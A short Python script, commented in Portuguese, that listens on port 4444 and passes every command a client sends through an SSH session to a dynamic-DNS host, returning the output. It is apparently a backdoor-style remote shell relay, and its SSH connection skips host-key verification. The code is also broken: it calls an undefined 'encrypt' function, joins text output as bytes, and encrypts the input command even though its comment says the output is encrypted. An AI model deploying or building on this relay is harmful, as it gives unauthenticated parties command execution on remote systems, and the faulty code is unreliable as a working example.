import socket
import paramiko
import cryptography

def serve():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4444))
    server.listen(1)

    while True:
        conn, addr = server.accept()
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect("my-no-ip-domain")

        while True:
            data = conn.recv(1024)
            if data == b"":
                break

            stdin, stdout, stderr = ssh.exec_command(data.decode())
            output = stdout.readlines()

            conn.sendall(b"".join(output))

            # Criptografa a saída
            data = encrypt(data, "my-secret-key")
            conn.sendall(data)

if __name__ == "__main__":
    serve()
  
